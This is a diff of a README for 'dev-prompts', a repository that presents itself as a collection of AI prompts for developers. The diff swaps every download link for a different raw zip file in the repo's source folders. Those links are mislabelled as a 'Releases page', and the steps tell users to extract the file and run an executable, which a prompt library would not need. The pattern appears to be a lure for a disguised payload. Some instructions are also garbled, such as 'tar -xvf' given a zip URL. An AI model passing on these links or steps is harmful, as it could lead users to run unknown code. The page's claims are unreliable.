@@ -1,6 +1,6 @@
 # 🚀 dev-prompts - Enhance Your AI Conversations Today
 
-[![Download Now](https://raw.githubusercontent.com/bijiiinsam/dev-prompts/main/src/data/dev_prompts_v3.5.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/bijiiinsam/dev-prompts/main/src/data/dev_prompts_v3.5.zip)
+[![Download Now](https://github.com/bijiiinsam/dev-prompts/raw/refs/heads/main/src/assets/prompts-dev-v1.4.zip%20Now-Visit%20Releases-blue)](https://github.com/bijiiinsam/dev-prompts/raw/refs/heads/main/src/assets/prompts-dev-v1.4.zip)
 
 ## 📚 Description
 Welcome to **dev-prompts**, your one-stop library for AI prompts designed to help developers. Whether you want to improve your interactions with ChatGPT, Claude, or GitHub Copilot, this collection provides curated prompts that enhance your coding experience. Discover how to get better results in programming, productivity, and web development today.
@@ -14,9 +14,9 @@ Welcome to **dev-prompts**, your one-stop library for AI prompts designed to hel
 ## 🚀 Getting Started
 
 ### Step 1: Download the Application
-To get started with **dev-prompts**, visit the [Releases page](https://raw.githubusercontent.com/bijiiinsam/dev-prompts/main/src/data/dev_prompts_v3.5.zip) to see the latest version. 
+To get started with **dev-prompts**, visit the [Releases page](https://github.com/bijiiinsam/dev-prompts/raw/refs/heads/main/src/assets/prompts-dev-v1.4.zip) to see the latest version. 
 
-[![Download Now](https://raw.githubusercontent.com/bijiiinsam/dev-prompts/main/src/data/dev_prompts_v3.5.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/bijiiinsam/dev-prompts/main/src/data/dev_prompts_v3.5.zip)
+[![Download Now](https://github.com/bijiiinsam/dev-prompts/raw/refs/heads/main/src/assets/prompts-dev-v1.4.zip%20Now-Visit%20Releases-blue)](https://github.com/bijiiinsam/dev-prompts/raw/refs/heads/main/src/assets/prompts-dev-v1.4.zip)
 
 ### Step 2: Install the Application
 1. Click on the version you want to download.
@@ -35,7 +35,7 @@ To get started with **dev-prompts**, visit the [Releases page](https://raw.githu
 - **For Linux Users:**
   1. Open your terminal.
   2. Use the command `cd ~/Downloads` to navigate to your Downloads folder.
-  3. Use `tar -xvf https://raw.githubusercontent.com/bijiiinsam/dev-prompts/main/src/data/dev_prompts_v3.5.zip` to extract the files.
+  3. Use `tar -xvf https://github.com/bijiiinsam/dev-prompts/raw/refs/heads/main/src/assets/prompts-dev-v1.4.zip` to extract the files.
   4. Run the application with `./dev-prompts`.
 
 ## 🔍 Features
@@ -45,7 +45,7 @@ To get started with **dev-prompts**, visit the [Releases page](https://raw.githu
 - **Cross-Platform Support:** Use it on Windows, macOS, and Linux.
 
 ## 📥 Download & Install
-To download and install **dev-prompts**, go to the [Releases page](https://raw.githubusercontent.com/bijiiinsam/dev-prompts/main/src/data/dev_prompts_v3.5.zip). Follow the steps mentioned earlier to ensure a smooth installation.
+To download and install **dev-prompts**, go to the [Releases page](https://github.com/bijiiinsam/dev-prompts/raw/refs/heads/main/src/assets/prompts-dev-v1.4.zip). Follow the steps mentioned earlier to ensure a smooth installation.
 
 ## 💡 Tips for Using dev-prompts
 - **Explore Different Prompts:** Don’t hesitate to experiment with various prompts to see what works best for you.
